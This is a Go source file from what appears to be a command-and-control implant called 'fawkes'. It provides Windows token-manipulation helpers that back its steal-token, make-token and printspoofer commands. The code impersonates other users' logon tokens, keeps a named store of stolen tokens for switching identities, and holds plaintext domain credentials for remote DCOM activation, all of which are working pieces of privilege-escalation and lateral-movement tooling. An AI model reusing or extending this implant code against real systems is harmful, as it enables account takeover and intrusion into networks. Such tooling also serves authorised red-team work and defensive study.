//go:build windows
// +build windows

package commands

import (
	"fmt"
	"runtime"
	"sync"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// Token state management - centralized like Apollo's IdentityManager
// and Xenon's gIdentityToken in Identity.c
var (
	// gIdentityToken holds the current impersonation token
	// This is set by make-token and steal-token, cleared by rev2self
	gIdentityToken windows.Token

	// gIdentityCreds stores plaintext credentials from make-token
	// Needed for DCOM/COM remote activation which requires explicit COAUTHINFO
	// (thread impersonation tokens are not used by CoCreateInstanceEx for remote calls)
	gIdentityCreds *StoredCredentials

	// tokenMutex protects token operations from race conditions
	tokenMutex sync.Mutex

	// gTokenStore holds named tokens for quick switching between identities.
	// Tokens are saved via token-store save and restored via token-store use.
	gTokenStore = make(map[string]*SavedToken)
)

// SavedToken holds a duplicated token along with metadata for the token store.
type SavedToken struct {
	Token    windows.Token
	Identity string             // DOMAIN\username at save time
	Source   string             // "steal-token", "make-token", "printspoofer", etc.
	Creds    *StoredCredentials // non-nil if from make-token
}

// StoredCredentials holds plaintext credentials for use by commands
// that need explicit authentication (e.g., DCOM remote COM activation)
type StoredCredentials struct {
	Domain   string
	Username string
	Password string
}

// Windows API constants for token manipulation
const (
	LOGON32_LOGON_INTERACTIVE       = 2
	LOGON32_LOGON_NETWORK           = 3
	LOGON32_LOGON_BATCH             = 4
	LOGON32_LOGON_SERVICE           = 5
	LOGON32_LOGON_UNLOCK            = 7
	LOGON32_LOGON_NETWORK_CLEARTEXT = 8
	LOGON32_LOGON_NEW_CREDENTIALS   = 9

	LOGON32_PROVIDER_DEFAULT = 0
	LOGON32_PROVIDER_WINNT50 = 3
	LOGON32_PROVIDER_VIRTUAL = 4

	// Token access rights - use specific rights instead of TOKEN_ALL_ACCESS
	// TOKEN_ALL_ACCESS often fails on protected processes
	TOKEN_ASSIGN_PRIMARY    = 0x0001
	TOKEN_DUPLICATE         = 0x0002
	TOKEN_IMPERSONATE       = 0x0004
	TOKEN_QUERY             = 0x0008
	TOKEN_QUERY_SOURCE      = 0x0010
	TOKEN_ADJUST_PRIVILEGES = 0x0020
	TOKEN_ADJUST_GROUPS     = 0x0040
	TOKEN_ADJUST_DEFAULT    = 0x0080
	TOKEN_ADJUST_SESSIONID  = 0x0100

	// Combined access for steal-token: query + duplicate + impersonate
	STEAL_TOKEN_ACCESS = TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE

	// Process access rights (PROCESS_QUERY_INFORMATION is in vanillainjection.go)
	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
)

// Windows API procedures - shared across all token commands
// Note: kernel32 is declared in vanillainjection.go
var (
	advapi32                    = windows.NewLazySystemDLL("advapi32.dll")
	procLogonUserW              = advapi32.NewProc("LogonUserW")
	procImpersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
	procRevertToSelf            = advapi32.NewProc("RevertToSelf")
	procDuplicateTokenEx        = advapi32.NewProc("DuplicateTokenEx")
	procSetThreadToken          = advapi32.NewProc("SetThreadToken")
	procOpenProcessToken        = advapi32.NewProc("OpenProcessToken")
)

// RevertCurrentToken implements Xenon's IdentityAgentRevertToken (Identity.c lines 35-52)
// Closes any existing impersonation token and reverts to original context.
// Also releases the OS thread lock set by PrepareExecution.
func RevertCurrentToken() error {
	tokenMutex.Lock()
	defer tokenMutex.Unlock()

	// Close existing token if present
	if gIdentityToken != 0 {
		windows.CloseHandle(windows.Handle(gIdentityToken))
		gIdentityToken = 0
	}

	// Clear stored credentials (zero password before releasing)
	zeroStoredCredentials(gIdentityCreds)
	gIdentityCreds = nil

	// Call RevertToSelf to drop any thread impersonation
	ret, _, err := procRevertToSelf.Call()
	if ret == 0 {
		return fmt.Errorf("RevertToSelf failed: %v", err)
	}

	// Release OS thread lock since we're no longer impersonating
	if osThreadLocked {
		runtime.UnlockOSThread()
		osThreadLocked = false
	}

	return nil
}

// SetIdentityToken stores the token and impersonates it
func SetIdentityToken(token windows.Token) error {
	tokenMutex.Lock()
	defer tokenMutex.Unlock()

	// Clear any existing token first
	if gIdentityToken != 0 {
		windows.CloseHandle(windows.Handle(gIdentityToken))
		gIdentityToken = 0
		procRevertToSelf.Call()
	}

	// Impersonate the new token
	ret, _, err := procImpersonateLoggedOnUser.Call(uintptr(token))
	if ret == 0 {
		return fmt.Errorf("ImpersonateLoggedOnUser failed: %v", err)
	}

	// Store the token for later use
	gIdentityToken = token
	return nil
}

// GetTokenUserInfo implements Xenon's IdentityGetUserInfo (Identity.c lines 88-114)
// Returns "DOMAIN\username" for the given token
func GetTokenUserInfo(token windows.Token) (string, error) {
	tokenUser, err := token.GetTokenUser()
	if err != nil {
		return "", fmt.Errorf("GetTokenUser failed: %v", err)
	}

	account, domain, _, err := tokenUser.User.Sid.LookupAccount("")
	if err != nil {
		return "", fmt.Errorf("LookupAccount failed: %v", err)
	}

	return fmt.Sprintf("%s\\%s", domain, account), nil
}

// GetCurrentIdentity returns the current thread or process identity
func GetCurrentIdentity() (string, error) {
	// Try thread token first (if impersonating)
	var threadToken windows.Token
	err := windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_QUERY, true, &threadToken)
	if err == nil {
		defer threadToken.Close()
		return GetTokenUserInfo(threadToken)
	}

	// Fall back to process token
	processHandle, err := windows.GetCurrentProcess()
	if err != nil {
		return "", fmt.Errorf("GetCurrentProcess failed: %v", err)
	}

	var processToken windows.Token
	err = windows.OpenProcessToken(processHandle, windows.TOKEN_QUERY, &processToken)
	if err != nil {
		return "", fmt.Errorf("OpenProcessToken failed: %v", err)
	}
	defer processToken.Close()

	return GetTokenUserInfo(processToken)
}

// HasActiveImpersonation checks if we're currently impersonating
func HasActiveImpersonation() bool {
	var threadToken windows.Token
	err := windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_QUERY, true, &threadToken)
	if err != nil {
		return false
	}
	threadToken.Close()
	return true
}

// SetIdentityCredentials stores plaintext credentials alongside the token.
// Called by make-token so that DCOM and other commands requiring explicit
// auth credentials can use them.
func SetIdentityCredentials(domain, username, password string) {
	tokenMutex.Lock()
	defer tokenMutex.Unlock()
	gIdentityCreds = &StoredCredentials{
		Domain:   domain,
		Username: username,
		Password: password,
	}
}

// GetIdentityCredentials returns stored credentials from the last make-token call.
// Returns nil if no credentials are stored (e.g., using steal-token or no impersonation).
func GetIdentityCredentials() *StoredCredentials {
	tokenMutex.Lock()
	defer tokenMutex.Unlock()
	if gIdentityCreds == nil {
		return nil
	}
	// Return a copy to avoid races
	return &StoredCredentials{
		Domain:   gIdentityCreds.Domain,
		Username: gIdentityCreds.Username,
		Password: gIdentityCreds.Password,
	}
}

// SaveTokenToStore saves the current impersonation token to the store under the given name.
// The token is duplicated so the active token and stored token are independent handles.
func SaveTokenToStore(name, source string) error {
	tokenMutex.Lock()
	defer tokenMutex.Unlock()

	if gIdentityToken == 0 {
		return fmt.Errorf("no active impersonation token to save")
	}

	// Duplicate the token so stored and active are independent handles
	var dupToken windows.Token
	err := windows.DuplicateTokenEx(
		gIdentityToken,
		windows.MAXIMUM_ALLOWED,
		nil,
		windows.SecurityImpersonation,
		windows.TokenPrimary,
		&dupToken,
	)
	if err != nil {
		return fmt.Errorf("DuplicateTokenEx failed: %v", err)
	}

	identity, _ := GetTokenUserInfo(dupToken)

	// Close any existing token with the same name
	if old, exists := gTokenStore[name]; exists {
		windows.CloseHandle(windows.Handle(old.Token))
	}

	var savedCreds *StoredCredentials
	if gIdentityCreds != nil {
		savedCreds = &StoredCredentials{
			Domain:   gIdentityCreds.Domain,
			Username: gIdentityCreds.Username,
			Password: gIdentityCreds.Password,
		}
	}

	gTokenStore[name] = &SavedToken{
		Token:    dupToken,
		Identity: identity,
		Source:   source,
		Creds:    savedCreds,
	}

	return nil
}

// UseTokenFromStore activates a stored token by name, replacing the current impersonation.
func UseTokenFromStore(name string) (string, error) {
	tokenMutex.Lock()
	defer tokenMutex.Unlock()

	saved, exists := gTokenStore[name]
	if !exists {
		return "", fmt.Errorf("no token stored with name %q", name)
	}

	// Duplicate the stored token so the store keeps its copy
	var dupToken windows.Token
	err := windows.DuplicateTokenEx(
		saved.Token,
		windows.MAXIMUM_ALLOWED,
		nil,
		windows.SecurityImpersonation,
		windows.TokenPrimary,
		&dupToken,
	)
	if err != nil {
		return "", fmt.Errorf("DuplicateTokenEx failed: %v", err)
	}

	// Clear current impersonation
	if gIdentityToken != 0 {
		windows.CloseHandle(windows.Handle(gIdentityToken))
		gIdentityToken = 0
		procRevertToSelf.Call()
	}

	// Impersonate the stored token
	ret, _, sysErr := procImpersonateLoggedOnUser.Call(uintptr(dupToken))
	if ret == 0 {
		windows.CloseHandle(windows.Handle(dupToken))
		return "", fmt.Errorf("ImpersonateLoggedOnUser failed: %v", sysErr)
	}

	gIdentityToken = dupToken

	// Restore credentials if the saved token had them
	if saved.Creds != nil {
		gIdentityCreds = &StoredCredentials{
			Domain:   saved.Creds.Domain,
			Username: saved.Creds.Username,
			Password: saved.Creds.Password,
		}
	} else {
		gIdentityCreds = nil
	}

	return saved.Identity, nil
}

// RemoveTokenFromStore removes and closes a stored token by name.
func RemoveTokenFromStore(name string) error {
	tokenMutex.Lock()
	defer tokenMutex.Unlock()

	saved, exists := gTokenStore[name]
	if !exists {
		return fmt.Errorf("no token stored with name %q", name)
	}

	zeroStoredCredentials(saved.Creds)
	windows.CloseHandle(windows.Handle(saved.Token))
	delete(gTokenStore, name)
	return nil
}

// ListTokenStore returns a copy of all stored token entries (without the actual handles).
func ListTokenStore() map[string]*SavedToken {
	tokenMutex.Lock()
	defer tokenMutex.Unlock()

	result := make(map[string]*SavedToken, len(gTokenStore))
	for k, v := range gTokenStore {
		result[k] = v
	}
	return result
}

// zeroUTF16Ptr zeros a null-terminated UTF-16 string in-place.
// Used to clear password buffers passed to Windows API calls like LogonUserW.
func zeroUTF16Ptr(p *uint16) {
	if p == nil {
		return
	}
	for ptr := p; *ptr != 0; ptr = (*uint16)(unsafe.Add(unsafe.Pointer(ptr), 2)) {
		*ptr = 0
	}
}

// zeroStoredCredentials clears the password from a StoredCredentials struct.
func zeroStoredCredentials(creds *StoredCredentials) {
	if creds == nil {
		return
	}
	structs.ZeroString(&creds.Password)
}
